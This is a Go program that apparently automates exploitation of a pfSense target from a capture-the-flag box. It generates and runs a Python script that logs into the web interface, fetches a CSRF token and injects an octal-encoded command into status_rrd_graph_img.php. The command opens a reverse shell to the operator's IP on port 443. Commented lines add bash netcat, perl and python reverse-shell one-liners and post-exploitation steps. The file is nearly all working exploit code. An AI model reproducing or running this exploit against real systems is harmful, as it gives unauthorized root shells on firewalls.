package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"

	"github.com/gocolly/colly"
)

var csrfval string

func init() {
	csrfval = ""
}

func main() {
	getvalfromconsole := bufio.NewReader(os.Stdin)
	fmt.Printf("Emter Sense IP : ")
	ip, _ := getvalfromconsole.ReadString('\n')
	ip = strings.Replace(ip, "\n", "", -1)
	fmt.Printf("Emter Your(VPN) IP : ")
	vpnip, _ := getvalfromconsole.ReadString('\n')
	vpnip = strings.Replace(vpnip, "\n", "", -1)
	createrootshellfile(vpnip, ip)
}

func logintopfsense(urlval string) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	c := colly.NewCollector(
		colly.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"),
	)
	c.WithTransport(tr)

	c.OnRequest(func(r *colly.Request) {
		r.Headers.Set("Accept", `text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`)
		r.Headers.Set("Accept-Language", "en-US,en;q=0.5")
		r.Headers.Set("Referer", urlval)
		r.Headers.Set("Connection", "close")
		r.Headers.Set("Upgrade-Insecure-Requests", "1")
		r.Headers.Set("Content-Type", "application/x-www-form-urlencoded")
	})
	// authenticate

	c.OnResponse(func(r *colly.Response) {
		log.Println(string(r.Body))
		//log.Println(r.StatusCode)
	})
	c.Visit(urlval + `/index.php`)
	err := c.Post(urlval, map[string]string{"usernamefld": "rohit", "passwordfld": "pfsense", "__csrf_magic": csrfval})
	if err != nil {
		log.Fatal(err)
	}
	//escapeshell:= `python -c 'import pty; pty.spawn("/bin/sh")'`
	//bashonliner := `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc URIP 443 >/tmp/f`
	//perloneliner := `perl -e 'use Socket;$i="VPNIP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
	//pythonrevshell := `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPNIP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
	//pythonrevshell = strings.Replace(pythonrevshell, "VPNIP", senseIP, -1)

}

func crawlform(urlval string) {

	fmt.Println(urlval)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	c := colly.NewCollector(
		colly.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"),
	)
	c.WithTransport(tr)
	c.OnHTML("form", func(e *colly.HTMLElement) {
		action := e.Attr("action")
		id := e.Attr("id")
		method := e.Attr("method")

		fmt.Println("Action : " + action)
		fmt.Println("Form ID : " + id)
		fmt.Println("Method : " + method)
		fmt.Println("---------------------------------------------------")
		e.ForEach("input", func(index int, element *colly.HTMLElement) {
			if element.Attr("name") == "__csrf_magic" {
				fmt.Println(element.Attr("name") + " <==> " + element.Attr("value") + "]")
				csrfval = element.Attr("value")
			}
		})
		fmt.Println("---------------------------------------------------")

	})
	c.Visit(urlval)
}

func createrootshellfile(vpnip, senseIP string) {
	getrootshell := `
#!/usr/bin/env python3

import requests
import urllib
import urllib3
import collections
rhost = 'SENSEIP'
lhost = 'VPNIP'
lport = 443
username = 'rohit'
password = 'pfsense'
	
	
# command to be converted into octal
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)
	

payload = ""
	
# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"
	
headers = [
	('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'),
	('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
	('Accept-Language', 'en-US,en;q=0.5'),
	('Referer',login_url),
	('Connection', 'close'),
	('Upgrade-Insecure-Requests', '1'),
	('Content-Type', 'application/x-www-form-urlencoded')
]
	
# probably not necessary but did it anyways
headers = collections.OrderedDict(headers)
	
# Disable insecure https connection warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
	
client = requests.session()
	
# try to get the login page and grab the csrf token
try:
	login_page = client.get(login_url, verify=False)

	index = login_page.text.find("csrfMagicToken")
	csrf_token = login_page.text[index:index+128].split('"')[-1]

except:
	print("Could not connect to host!")
	exit()

# format login variables and data
if csrf_token:
	print("CSRF token obtained")
	login_data = [('__csrf_magic',csrf_token), ('usernamefld',username), ('passwordfld',password), ('login','Login') ]
	login_data = collections.OrderedDict(login_data)
	encoded_data = urllib.parse.urlencode(login_data)

# POST login request with data, cookies and header
	login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers)
else:
	print("No CSRF token!")
	exit()
	
if login_request.status_code == 200:
		print("Running exploit...")
# make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell
		try:
			exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5)
			if exploit_request.status_code:
				print("Error running exploit")
		except:
			print("Exploit completed")
	`

	getrootshell = strings.Replace(getrootshell, "VPNIP", vpnip, -1)
	getrootshell = strings.Replace(getrootshell, "SENSEIP", senseIP, -1)
	sensroot, _ := os.Create("senseroot.py")
	sensroot.WriteString(getrootshell)
	sensroot.Close()
	pythonPath, err := exec.LookPath("python3")
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println((pythonPath))
	cmd := exec.Command(pythonPath, "senseroot.py")
	err = cmd.Start()
	//fmt.Println(string(output))
	fmt.Println("........")
	if err != nil {
		fmt.Println(err)
		return

	}
	cmd.Wait()
	//Escape to a better shell ==> python -c 'import pty; pty.spawn("/bin/sh")'
	//cd /var/www/laravel
	//mv artisan artisanbk
	//python -m SimpleHTTPServer 8080 [this should be in attacker machine]
}
